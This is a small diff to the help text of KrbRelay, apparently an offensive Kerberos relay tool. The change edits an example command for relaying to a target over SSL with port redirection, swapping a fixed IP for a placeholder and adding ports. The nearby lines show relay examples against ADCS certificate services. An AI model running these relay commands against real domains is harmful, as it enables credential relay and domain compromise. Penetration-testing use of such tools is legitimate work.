@@ -274,7 +274,7 @@ byte[] securityBlob = new byte[securityBufferLength];
                 Console.WriteLine("    KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>");
                 Console.WriteLine();
                 Console.WriteLine("  Relay attacks with SSL and port forwarding:");
-                Console.WriteLine("    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver 192.168.1.50 -redirectports 3389,5985");
+                Console.WriteLine("    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver <ip_target_host> -redirectports 3389,5985,135,80,443");
                 Console.WriteLine();
 
             Console.WriteLine("Notes:");
